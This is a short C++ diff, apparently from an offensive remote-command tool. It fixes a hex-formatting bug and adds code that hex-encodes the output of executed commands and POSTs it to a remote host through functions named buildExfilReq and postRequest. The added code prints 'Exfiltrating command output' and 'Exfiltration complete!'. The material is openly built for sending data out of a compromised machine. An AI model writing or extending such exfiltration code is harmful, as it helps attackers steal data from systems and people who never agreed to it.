@@ -108,7 +108,7 @@ std::string stringToHex(const std::string& input){
     std::string result = "";
     for (unsigned char c : input){
         char hex[3];
-        sprintf(hex, "02x", c);
+        sprintf(hex, "%02x", c);
         result += hex;
     }
     return result;
@@ -152,6 +152,18 @@ int main() {
         std::cout << "\n================= EXECUTION OUTPUT =================" << std::endl;
         std::cout << output;
         std::cout << "====================================================" << std::endl;
+        
+        // 1. Run the output string through stringToHex
+        std::string hexOutput = stringToHex(output);
+        
+        // 2. Pass that hex string to Rpcengine::buildExfilReq()
+        std::string exfilRequest = Rpcengine::buildExfilReq(hexOutput);
+        
+        // 3. Fire it off using HTTPClient::postRequest()
+        std::cout << "[*] Exfiltrating command output..." << std::endl;
+        std::string exfilResponse = HTTPClient::postRequest(host, path, exfilRequest);
+        std::cout << "[+] Exfiltration complete!" << std::endl;
+
     }
 
     return 0;
